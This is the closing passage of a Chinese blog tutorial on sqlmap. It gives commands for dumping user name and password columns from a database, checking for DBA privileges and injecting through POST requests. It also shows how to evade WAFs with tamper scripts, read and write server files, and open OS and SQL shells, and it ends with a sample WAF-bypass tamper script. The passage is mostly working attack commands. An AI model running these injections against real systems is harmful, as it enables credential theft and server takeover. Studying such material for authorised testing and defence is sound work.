<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">dump </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">C</span> <span style="color:#669900;">"name,pass"</span> <span style="color:#9a6e3a;">-</span><span style="color:#990055;">T</span><span style="color:#000000;"> users </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">D</span><span style="color:#000000;"> acuart</span><span style="color:#708090;">//查询列name pass中的数据</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">dump</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">all </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">C</span> <span style="color:#669900;">"name,pass"</span> <span style="color:#9a6e3a;">-</span><span style="color:#990055;">T</span><span style="color:#000000;"> users </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">D</span><span style="color:#000000;"> acuart</span><span style="color:#708090;">//查询所有数据</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">is</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">dba</span><span style="color:#708090;">//判断是否为高权限用户 current user is DBA: False这种情况就是低权限</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">r xx</span><span style="color:#9a6e3a;">.</span><span style="color:#dd4a68;">txt</span><span style="color:#999999;">(</span><span style="color:#000000;">文件为请求数据包和post提交数据，在注入点后面加</span><span style="color:#9a6e3a;">*</span><span style="color:#999999;">)</span><span style="color:#708090;">//非get方式注入点的方法</span>
 <span style="color:#9a6e3a;">-</span><span style="color:#000000;">tamper</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxx</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">py </span><span style="color:#708090;">//对于有waf或者编码等问题我们可以使用tamper脚本。</span>
 <span style="color:#9a6e3a;">-</span><span style="color:#000000;">v 数字</span>
  <span style="color:#990055;">0</span><span style="color:#000000;">：只显示Python的回溯，错误和关键消息。 </span>
    <span style="color:#990055;">1</span><span style="color:#000000;">：显示信息和警告消息。 </span>
    <span style="color:#990055;">2</span><span style="color:#000000;">：显示调试消息。 </span>
    <span style="color:#990055;">3</span><span style="color:#000000;">：有效载荷注入。 </span>
    <span style="color:#990055;">4</span><span style="color:#000000;">：显示</span><span style="color:#990055;">HTTP</span><span style="color:#000000;">请求。 </span>
    <span style="color:#990055;">5</span><span style="color:#000000;">：显示</span><span style="color:#990055;">HTTP</span><span style="color:#000000;">响应头。 </span>
    <span style="color:#990055;">6</span><span style="color:#000000;">：显示</span><span style="color:#990055;">HTTP</span><span style="color:#000000;">响应页面的内容 </span>
    
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">user</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">agent </span><span style="color:#669900;">""</span>  <span style="color:#708090;">#自定义user-agent 默认是sqlmap</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">random</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">agent   </span><span style="color:#708090;">#随机user-agent</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">time</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">sec</span><span style="color:#9a6e3a;">=</span><span style="color:#999999;">(</span><span style="color:#990055;">2</span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">5</span><span style="color:#999999;">)</span> <span style="color:#708090;">#延迟响应，默认为5</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">level</span><span style="color:#9a6e3a;">=</span><span style="color:#999999;">(</span><span style="color:#990055;">1</span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">5</span><span style="color:#999999;">)</span> <span style="color:#708090;">#要执行的测试水平等级，默认为1 </span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">risk</span><span style="color:#9a6e3a;">=</span><span style="color:#999999;">(</span><span style="color:#990055;">0</span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">3</span><span style="color:#999999;">)</span>  <span style="color:#708090;">#测试执行的风险等级，默认为1 </span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">proxy </span><span style="color:#669900;">"http:/127.0.0.1:8888"</span> <span style="color:#708090;">#代理注入,便于抓包查看注入过程的数据包，sqlmap和bp联动</span>

<span style="color:#000000;">如果当前是高权限用户，可以使用以下命令：</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">sql</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">shell </span><span style="color:#708090;">//可以执行sql命令</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">file</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">read </span><span style="color:#669900;">"d:\\xx.txt"</span> <span style="color:#708090;">//读取文件xx.txt</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">file</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">write </span><span style="color:#669900;">"d:\\xx.txt"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">file</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">dest </span><span style="color:#669900;">"/root/xx"</span> <span style="color:#708090;">//将本地d盘下xxx文件写入服务器root目录下xx文件</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">os</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">cmd</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">calc </span><span style="color:#708090;">//执行cmd命令 弹出计算器</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">os</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">shell </span><span style="color:#708090;">//执行shell命令</span>
<span style="color:#9a6e3a;">--</span><span style="color:#000000;">dbs </span><span style="color:#708090;">//查看所有数据库</span>
</code></span></pre> 
 <p></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">"""</span>
<span style="color:#000000;">tamper脚本书写模板</span>
<span style="color:#000000;">"""</span>
<span style="color:#0077aa;">from</span><span style="color:#000000;"> lib</span><span style="color:#999999;">.</span><span style="color:#000000;">core</span><span style="color:#999999;">.</span><span style="color:#000000;">enums </span><span style="color:#0077aa;">import</span><span style="color:#000000;"> PRIORITY</span>

<span style="color:#000000;">__priority__ </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> PRIORITY</span><span style="color:#999999;">.</span><span style="color:#000000;">LOW</span>

<span style="color:#0077aa;">def</span> <span style="color:#dd4a68;">dependencies</span><span style="color:#999999;">():</span>
    <span style="color:#0077aa;">pass</span>

<span style="color:#0077aa;">def</span> <span style="color:#dd4a68;">tamper</span><span style="color:#999999;">(</span><span style="color:#000000;">payload</span><span style="color:#999999;">,</span> <span style="color:#9a6e3a;">**</span><span style="color:#000000;">kwargs</span><span style="color:#999999;">):</span>
    <span style="color:#0077aa;">if</span><span style="color:#000000;"> payload</span><span style="color:#999999;">:</span>      
<span style="color:#000000;">        payload </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> payload</span><span style="color:#999999;">.</span><span style="color:#000000;">replace</span><span style="color:#999999;">(</span><span style="color:#669900;">'SELECT'</span><span style="color:#999999;">,</span><span style="color:#669900;">'sElEct'</span><span style="color:#999999;">)</span>
<span style="color:#000000;">        payload </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> payload</span><span style="color:#999999;">.</span><span style="color:#000000;">replace</span><span style="color:#999999;">(</span><span style="color:#669900;">'OR'</span><span style="color:#999999;">,</span><span style="color:#669900;">'Or'</span><span style="color:#999999;">)</span>
<span style="color:#000000;">        payload </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> payload</span><span style="color:#999999;">.</span><span style="color:#000000;">replace</span><span style="color:#999999;">(</span><span style="color:#669900;">'AND'</span><span style="color:#999999;">,</span><span style="color:#669900;">'And'</span><span style="color:#999999;">)</span>
<span style="color:#000000;">        payload </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> payload</span><span style="color:#999999;">.</span><span style="color:#000000;">replace</span><span style="color:#999999;">(</span><span style="color:#669900;">'SLEEP'</span><span style="color:#999999;">,</span><span style="color:#669900;">'SleeP'</span><span style="color:#999999;">)</span>
<span style="color:#000000;">        payload </span><span style="color:#9a6e3a;">=</span><span style="color:#000000;"> payload</span><span style="color:#999999;">.</span><span style="color:#000000;">replace</span><span style="color:#999999;">(</span><span style="color:#669900;">'ELT'</span><span style="color:#999999;">,</span><span style="color:#669900;">'Elt'</span><span style="color:#999999;">)</span>
    <span style="color:#0077aa;">return</span><span style="color:#000000;"> payload</span>

</code></span></pre> 
 <p></p> 
 <p style="margin-left:0;text-align:left;"></p> 
</div>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f3541ac5b422fd237b57d61065eb0355/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">鸿蒙ArkUI-X跨端应用开发，一套代码构建多平台应用</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/b8294819afa24fd1d0e810dbdbd056e8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【车载开发系列】HexView文件合并</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>